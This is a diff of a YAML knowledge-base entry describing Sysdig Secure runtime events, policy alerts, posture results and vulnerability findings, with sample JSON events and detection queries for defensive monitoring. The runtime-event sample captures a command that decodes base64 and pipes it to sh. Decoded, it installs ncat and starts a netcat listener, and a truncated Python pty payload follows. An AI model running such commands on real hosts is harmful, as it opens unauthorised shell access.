@@ -1,88 +1,111 @@
+# Goatpedia entry — see CONTRIBUTING.md and schema/entry.schema.json
 id: sysdig
-name: Sysdig
+name: Sysdig Secure
 short: Sysdig
-vendor: Sysdig
+vendor: Sysdig, Inc.
 category: saas
 status: full
-updated: '2026-11-12'
+updated: '2026-11-16'
 contributors:
   - wlinde
 aka:
-  - sysdig
-  - Elastic integrations
+  - Sysdig
+  - Sysdig Secure
+  - Sysdig Monitor
 tags:
-  - elastic
-  - json
-summary: Sysdig is logged by the Elastic integrations package sysdig. The Pack Generator samples pool holds fixture events for 4 sourcetypes. This article describes those fixtures and does not add CVE history.
+  - cnapp
+  - container-security
+  - kubernetes
+  - runtime-detection
+summary: A cloud-native application protection platform for containers, Kubernetes and cloud accounts. Sysdig agents on hosts watch system calls with Falco-based rules, and the Sysdig Secure SaaS backend also scans images for vulnerabilities and checks cloud posture against compliance benchmarks. Its streams cover runtime security events and policy alerts (what a process did in which container and pod), posture results per control, and image vulnerabilities with severity and fix version.
 sourcetypes:
   - st: sysdig
-    desc: 'Elastic integrations fixture, 7 events. Upstream: sysdig/data_stream/event/_dev/test/pipeline/test-event.log'
+    desc: Sysdig Secure events, such as runtime workload detections, with the rule, policy, severity, process and container fields and Kubernetes and cloud labels
   - st: sysdig_alerts
-    desc: 'Elastic integrations fixture, 9 events. Upstream: sysdig/data_stream/alerts/_dev/test/pipeline/test-sysdig.log'
+    desc: Policy alerts from Sysdig Secure, one per rule match on a host or container, with the rule, output, process fields and labels
   - st: sysdig_cspm
-    desc: 'Elastic integrations fixture, 10 events. Upstream: sysdig/data_stream/cspm/_dev/test/pipeline/test-cspm.log'
+    desc: Cloud security posture results, one per compliance requirement and control, with pass or fail, severity and counts of failing resources
   - st: sysdig_vulnerability
-    desc: 'Elastic integrations fixture, 5 events. Upstream: sysdig/data_stream/vulnerability/_dev/test/pipeline/test-vulnerability.log'
+    desc: Vulnerability findings for container images and hosts, one per package and vulnerability, with severity, CVSS, exploitability and fix version
 facts:
-  Where the sample comes from: Elastic integrations
-  Integration package: sysdig
-  Sourcetypes: '4'
-  Fixture events: '31'
-  Log format seen: json
-  Fields in the first fixture: category, content.fields.container.image.repository, content.fields.container.name, content.fields.evt.res, content.fields.evt.type, content.fields.group.gid
+  Product: Container, Kubernetes and cloud security (runtime detection, vulnerability management, posture)
+  Form factor: Sysdig agent (and Falco engine) on hosts and Kubernetes nodes, plus the Sysdig Secure SaaS backend
+  Detection engine: Falco rules over system calls and audit logs, grouped into policies with a severity
+  Log transport: HTTPS JSON from the Sysdig Secure APIs or event forwarding, received by any collector
+  Log format: One JSON object per event, alert, posture result or vulnerability
+  What a runtime event answers: Which rule matched, which process and command line ran, in which container, pod, namespace, cluster and cloud account
+  What a posture result answers: Which control of which benchmark passed or failed, and how many resources fail it
+  What a vulnerability answers: Which package in which image has which CVE, how severe it is, whether it is exploitable and which version fixes it
 placement:
   slots:
+    - internal
     - cloud
   items:
+    - slot: internal
+      title: Sysdig agent on nodes
+      desc: The agent runs on each host or Kubernetes node, inside the customer's data center or cloud network. It watches system calls of every container and evaluates Falco rules locally.
     - slot: cloud
-      title: Elastic integrations
-      desc: Fixtures were harvested from elastic/integrations. The product may also be deployed on a network or an endpoint; this article only places the source of the sample.
+      title: Sysdig Secure backend
+      desc: Agents send events to the Sysdig Secure SaaS, which also scans images and cloud accounts. A collector reads events, alerts, posture and vulnerabilities from its APIs.
 howItWorks:
-  - title: What the fixture shows
-    body: Sysdig events in this library are the test fixtures shipped with elastic/integrations (cbfff90638). The first event carries category, content.fields.container.image.repository, content.fields.container.name, content.fields.evt.res, content.fields.evt.type, content.fields.group.gid. Values in the sample were rewritten to documentation addresses.
+  - title: Runtime detection
+    body: The agent captures system calls through an eBPF probe or kernel module. Falco rules match patterns such as a shell in a container, user management commands or unexpected network tools. A match produces an event with the rule name, output text, process fields (proc.name, proc.cmdline, proc.pname) and container and Kubernetes labels.
+  - title: Policies and severity
+    body: Rules are grouped into policies. Each event carries the policy, an originator and a numeric severity, where lower numbers are more severe. Activity-log policies are intentionally noisy and meant for hunting rather than alerting.
+  - title: Posture and vulnerabilities
+    body: Sysdig evaluates cloud accounts against benchmarks such as CIS, giving pass or fail per requirement and control. Image and host scanning lists each vulnerable package with its CVE, CVSS score, exploitability, fix version and any risk acceptance.
+  - title: How the data leaves the product
+    body: A collector calls the Sysdig Secure APIs for events, posture results and vulnerability findings, or receives forwarded events. Each record is a JSON object for any destination.
 traffic:
   handles:
-    - json
+    - System calls of containers and hosts
+    - Kubernetes workloads and cloud accounts
+    - Container image packages
+    - Compliance controls
   flow:
-    - step: Collect
-      desc: The Elastic integrations package reads sysdig and the samples pool stores the fixture used here.
-    - step: Parse
-      desc: Goatpedia reads the fixture as json.
+    - step: Activity happens
+      desc: A process runs in a container, an image is deployed, or a cloud resource changes.
+    - step: Sysdig evaluates
+      desc: The agent matches Falco rules against system calls, and the backend scans images and cloud configuration.
+    - step: Result is recorded
+      desc: Sysdig Secure stores a runtime event, a policy alert, a posture result or a vulnerability finding.
+    - step: Collector receives
+      desc: A collector reads the record from the API. Goatpedia reads these samples as JSON.
 logs:
-  - type: Event
+  - type: Secure events
     sourcetype: sysdig
     format: json
-    desc: 7 fixture events in the samples pool (elastic).
+    desc: One security event. content.ruleName and name give the rule and policy, severity rates it, content.fields shows the process (proc.cmdline, proc.pcmdline, user.name) and container, and labels place it in a cluster, namespace, pod and cloud account. This sample is a custom rule matching a shell started from a base64-decoded script in a cron job container.
     sample: '{"category":"runtime","content":{"fields":{"container.image.repository":"docker.io/library/python","container.name":"shell-scripting","evt.res":"SUCCESS","evt.type":"execve","group.gid":"0","group.name":"root","proc.args":"","proc.cmdline":"sh","proc.cwd":"/","proc.exepath":"/usr/bin/dash","proc.hash.sha256":"f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6","proc.name":"sh","proc.pcmdline":"bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxz...","proc.pid":"1890726","proc.pid.ts":"1744002001003626585","proc.pname":"bash","proc.ppid":"1890704","proc.ppid.ts":"1744002000895807711","proc.sid":"1","user.loginname":"<NA>","user.loginuid":"-1","user.name":"root","user.uid":"0"},"origin":"Secure UI","output":"Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pnam...","policyId":10569534,"ruleName":"My test rule custom","ruleSubType":0,"ruleTags":["My-tag-custom-1-hello-world","MITTRE-WHATEVER"],"ruleType":6,"type":"workloadRuntimeDetection"},"description":"This is just a dumb policy to test custom policies","engine":"falco","id":"1a33f0946dabcdefabcdefad5c3e7f22","labels":{"cloudProvider.account.id":"123456789012","cloudProvider.name":"gcp","cloudProvider.region":"us-central1","container.image.digest":"sha256:aa7b73608abcfb0212401234567890123456789abcdefa610681097a54ca2c2a","container.image.id":"ef0abcdefbd2","container.image.repo":"docker.io/library/python","container.image.tag":"3.9.18-slim","container.label.io.kubernetes.container.name":"shell-scripting","container.label.io.kubernetes.pod.name":"shell-scripting-abcdef12-12345","container.label.io.kubernetes.pod.namespace":"default","container.name":"shell-scripting","gcp.location":"us-central1","gcp.projectId":"1231456789012","host.hostName":"gke-cluster-gcp-demo-san-default-pool-11234abc-abcd","host.mac":"2001:db8::1","kubernetes.cluster.name":"gke-alliances-demo-6","kubernetes.cronJob.name":"shell-scripting","kubernetes.job.name":"shell-scripting-29066700","kubernetes.namespace.name":"default","kubernetes.node.name":"gke-cluster-gcp-demo-san-default-pool-11234abc-abcd","kubernetes.pod.name":"shell-scripting-abcdef12-12345","kubernetes.workload.name":"shell-scripting","kubernetes.workload.type":"cronjob"},"name":"Manuel test policy","originator":"policy","rawEventCategory":"runtime","rawEventOriginator":"linuxAgent","severity":4,"source":"syscall","sourceDetails":{"subType":"container","type":"workload"},"timestamp":1744772461195149800}'
     key:
       - category
       - content.fields.container.image.repository
       - content.fields.container.name
       - content.fields.evt.res
-  - type: Alerts
+  - type: Policy alerts
     sourcetype: sysdig_alerts
     format: json
-    desc: 9 fixture events in the samples pool (elastic).
+    desc: One policy alert. content.ruleName and content.output say what matched, severity rates it, content.fields gives the process and container, and labels give the host, cluster and cloud. This sample is userdel run by pwsh as root, matched by a noisy activity-log policy at severity 7.
     sample: '{"id":"17dec715376910362c8c3f62a4ceda2e","type":"policy","timestamp":1720031001639981000,"timestampRFC3339Nano":"2024-07-03T18:23:21.63998111Z","originator":"policy","category":"runtime","source":"syscall","name":"Sysdig Runtime Activity Logs","description":"This policy contains rules which provide a greater insight into general activities occuring on the system. They are very noisy, but useful in threat hunting ...","severity":7,"agentId":58014837,"containerId":"6949e5f10829","machineId":"2001:db8::1","hostMac":"2001:db8::1","content":{"ruleName":"User Management Event Detected","ruleType":"RULE_TYPE_FALCO","ruleTags":["host","container"],"output":"Users management command userdel tmp_suid_user launched by pwsh on threatgen under user root (proc.name=userdel proc.args=tmp_suid_user fd.name=<NA> proc.cmd...","fields":{"container.name":"threatgen","proc.cmdline":"userdel tmp_suid_user","proc.cwd":"/tmp/","proc.exepath":"/usr/sbin/userdel","proc.name":"userdel","proc.pcmdline":"pwsh -c (./RunTests.ps1 STDIN.NETWORK DEV.SHM.EXEC T1048 RECON.FIND.SUID T1611.002 CONTAINER.ESCAPE.NSENTER CREDS.DUMP.MEMORY KILL.MALICIOUS.PROC LOAD.BPF.PR...","proc.pid":"2140169","proc.pname":"pwsh","proc.ppid":"2140088","user.name":"root","user.uid":"0"},"policyVersion":35,"policyOrigin":"Sysdig"},"labels":{"cloudProvider.account.id":"289645096542","cloudProvider.name":"gcp","cloudProvider.region":"us-central1","gcp.availabilityZone":"us-central1-c","gcp.instanceId":"648229130641697246","gcp.instanceName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","gcp.machineType":"e2-standard-4","gcp.projectId":"289645096542","gcp.projectName":"alliances-chronicle","host.hostName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","kubernetes.cluster.name":"gke-alliances-demo-6","kubernetes.namespace.name":"default","kubernetes.pod.name":"threatgen-c65cf6446-5s8kk","kubernetes.workload.type":"deployment"}}'
     key:
       - id
       - type
       - timestamp
       - timestampRFC3339Nano
-  - type: Cspm
+  - type: Posture results
     sourcetype: sysdig_cspm
     format: json
-    desc: 10 fixture events in the samples pool (elastic).
+    desc: One compliance requirement and control. policyName and name identify the benchmark requirement, control.name and control.severity the check, and pass with failedControls the result. This sample is the CIS AWS MFA requirement, passing.
     sample: '{"acceptedCount":0,"control":{"acceptedCount":0,"authors":"Sysdig","description":"Enabling MFA provides increased security for console access as it requires the authenticating principal to possess a device that displays a time-sensitive ke...","id":"16011","isManual":false,"lastUpdate":"1736935526","name":"IAM - Defined Users MFA (AWS)","objectsCount":0,"pass":true,"passingCount":0,"platform":"","remediationId":"16011","resourceApiEndpoint":"/api/cspm/v1/cloud/resources?controlId=16011&providerType=AWS&resourceKind=AWS_USER&filter=policyId=15 and zones.id=17769377","resourceKind":"AWS_USER","severity":"High","supportedDistributions":[{"maxVersion":0,"minVersion":0,"name":"aws"}],"target":"AWS","type":9},"description":"Multi-Factor Authentication (MFA) adds an extra layer of authentication assurance beyond traditional credentials. With MFA enabled, when a user signs in to t...","failedControls":0,"highSeverityCount":0,"lowSeverityCount":0,"mediumSeverityCount":0,"name":"1.10 Ensure multi-factor authentication (MFA) is enabled for all IAM users that have a console password","pass":true,"passingCount":0,"policyId":"15","policyName":"CIS Amazon Web Services Foundations Benchmark","requirementId":"16009","severity":"High","zone":{"id":"17769377","name":"Entire Infrastructure"}}'
     key:
       - acceptedCount
       - control.acceptedCount
       - control.authors
       - control.description
-  - type: Vulnerability
+  - type: Vulnerabilities
     sourcetype: sysdig_vulnerability
     format: json
-    desc: 5 fixture events in the samples pool (elastic).
+    desc: One vulnerable package. metadata.pullString names the image, package.name and package.version the package, package.vulnerability.name the CVE, severity and cvssScore how serious, exploitable whether an exploit is known, and package.suggestedFix the fix. Labels use example.com.
     sample: '{"assetType":"containerImage","metadata":{"architecture":"amd64","author":"","baseOs":"debian 11.7","createdAt":"2023-08-04T19:58:39.877819767Z","digest":"sha256:6e5c705adbdfd7aeff8d2d437f16f886a9c2b9723922088aa6e6a99428b3de08","imageId":"sha256:38789e38e9e97ec6d3a1d640d05a2c07813457ea432787f3cd9e87759ea35e4e","labels":{"homepage":"https://example.com","maintainer":"example Team <user@example.com>","org.label-schema.build-date":"2023-08-04T19:55:38Z","org.label-schema.name":"example-kubernetes-operator","org.label-schema.vcs-ref":"7992cc9","org.label-schema.vcs-url":"''https://github.com/example/example-kubernetes-operator''","org.opencontainers.image.description":"The example CLI, in a Docker container.","repository":"https://github.com/example/example"},"os":"linux","pullString":"docker.io/example/example-kubernetes-operator:v1.13.0","size":4797821440},"package":{"isRemoved":false,"isRunning":false,"license":"example","layers":{"baseImages":[{"baseImagesRef":"0000","pullStrings":["docker.cloudsmith.io/secure/sysdig/alpine:latest"]},{"baseImagesRef":"0001","pullStrings":["docker.cloudsmith.io/secure/sysdig/alpine0001:latest"]}],"command":"ADD alpine-minirootfs-3.21.3-aarch64.tar.gz / # buildkit","digest":"sha256:a16e98724c05975ee8c40d8fe389c3481373d34ab20a1cf52ea2accc43f71f4c","index":0,"layerRef":"f95aa9ae66563e7e808b","size":null},"name":"golang.org/x/net","packageRef":"183a66d2b001cb5300a3490b85cf17a7","path":"/usr/bin/ctr","suggestedFix":"v0.17.0","type":"golang","version":"v0.0.0-20220722155237-a158d28d115b","vulnerability":{"cisaKev":{},"cvssScore":{"score":6.5,"vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H","version":"3.1"},"disclosureDate":"1999-01-01","exploitable":false,"fixVersion":"2.9.10+dfsg-6.7+deb11u6","mainProvider":"nvd","name":"CVE-2023-45322","packageRef":"183a66d2b001cb5360428446966ff971","providersMetadata":{},"riskAccepts":[{"context":[{"type":"imageName","value":"nginx:latest"}],"createdAt":"2024-01-22T08:51:46.016464Z","description":"description","entityType":"imageName","entityValue":"nginx:latest","expirationDate":"2021-07-01","id":"550e8400-e29b","reason":"RiskMitigated","riskAcceptRefs":"e6b4b0d3255bfef","status":"active","updatedAt":"2024-01-22T08:51:46.016464Z"}],"severity":"medium","vulnerabilitiesRef":"183a66d2b001cb53ab718da7114e48fe"}},"producer":{"producedAt":"2025-04-28T06:14:20.641561Z"},"stage":"runtime"}'
     key:
       - assetType
@@ -91,17 +114,40 @@ logs:
       - metadata.baseOs
 cves: []
 detections:
-  - title: Sysdig events arriving
-    severity: low
+  - title: High-severity runtime detection
+    severity: high
     signals:
-      - category
-      - content.fields.container.image.repository
-      - content.fields.container.name
-    why: Confirms this source is present. It is not a vulnerability claim.
-    kql: '| where sourcetype == "sysdig"'
-optimizations: []
+      - severity
+      - content.ruleName
+      - content.fields.proc.cmdline
+      - labels.kubernetes.pod.name
+    why: Sysdig severities 0 to 3 are its high band. A runtime event at that level is a rule Sysdig considers a likely attack, such as a reverse shell or credential access in a container.
+    kql: |
+      dataset="sysdig_logs"
+      | where sourcetype == "sysdig" and severity <= 3
+      | project timestamp, name, content.ruleName, severity, content.fields.proc.cmdline, labels.kubernetes.namespace.name, labels.kubernetes.pod.name
+    mitre:
+      - T1059.004
+  - title: Exploitable vulnerability in an image
+    severity: high
+    signals:
+      - package.vulnerability.exploitable
+      - package.vulnerability.name
+      - package.vulnerability.severity
+      - metadata.pullString
+    why: An exploitable vulnerability has a known exploit. In an image that is running it is the finding to fix first.
+    kql: |
+      dataset="sysdig_logs"
+      | where sourcetype == "sysdig_vulnerability" and package.vulnerability.exploitable == true
+      | project metadata.pullString, package.name, package.version, package.vulnerability.name, package.vulnerability.severity, package.suggestedFix
+optimizations:
+  - title: Route informational activity alerts to storage
+    saving: most of the policy alert volume
+    fn: Routes
+    how: Activity-log policies describe themselves as very noisy and useful for threat hunting. Their alerts arrive at severity 7. Send them to cheaper storage and keep lower-numbered (more severe) alerts in the SIEM.
+    expr: severity == 7
 references:
-  - title: elastic/integrations sysdig/data_stream
-    url: https://github.com/elastic/integrations/blob/cbfff90638a7565377768f50726775c0febc7bf4/packages/sysdig/data_stream/event/_dev/test/pipeline/test-event.log
-  - title: Pack Generator sample sysdig.json
-    url: https://github.com/wvdlinde-cribl/cribl-pack-samples/blob/main/samples/sysdig.json
+  - title: Sysdig documentation
+    url: https://docs.sysdig.com/
+  - title: Falco documentation
+    url: https://falco.org/docs/
